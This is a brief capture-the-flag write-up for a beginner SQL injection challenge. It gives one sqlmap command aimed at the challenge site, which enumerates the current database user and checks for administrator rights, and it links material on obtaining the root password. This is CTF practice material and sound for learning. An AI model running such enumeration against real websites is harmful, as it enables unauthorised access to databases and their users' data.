#  SQL injection - 2 - Get the root user. (4) 

## Challenge 
SQL injection is probably one of the most common vectors of attack for poorly designed websites.
<a href="https://beginnersqli.hfctf.ca/">This page</a> is vulnerable to it. You can use username 
test and password test if you want to test the page before the injection.

## Steps
1. `sqlmap -u https://beginnersqli.hfctf.ca/ -o -b --current-user --is-dba`

## Documentation
- <a href="https://youtu.be/6QvpyEsVnvg">This video</a> explains how to get the root password.
- <a href="https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/"></a>

# Flag
``
